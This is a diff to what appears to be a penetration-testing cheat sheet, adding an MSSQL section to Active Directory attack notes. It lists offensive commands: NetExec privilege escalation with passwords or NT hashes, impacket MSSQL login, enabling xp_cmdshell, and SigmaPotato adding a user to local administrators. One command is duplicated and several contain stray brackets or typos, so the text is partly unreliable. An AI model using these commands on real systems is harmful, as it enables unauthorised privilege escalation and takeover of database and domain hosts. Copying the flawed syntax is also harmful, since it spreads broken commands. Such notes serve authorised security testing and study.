@@ -716,6 +716,35 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
 <details>
   <summary><strong>MSSQL</strong></summary>
 
+  ### MSSQL privesc
+  ```shell
+  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv
+  ```
+
+  ```shell
+  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv
+  ```
+
+  ### MSSQL execute commands
+  ```shell
+  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv -o ACTION=privesc
+  ```
+
+  ### impacket MSSQL
+  ```bash
+  impacket-mssqlclient <username>:<password>@<IP> -windows-auth]
+  ```
+
+  ### Enable xp_cmdshell
+  ```bash
+  enable_xp_cmdshell
+  ```
+
+  ### Privesc to local administrator as db_admin
+  ```bash
+  SigmaPotato.exe "net localgroup administrator <user> /add"
+  ```
+
 </details>
 
 # Linux
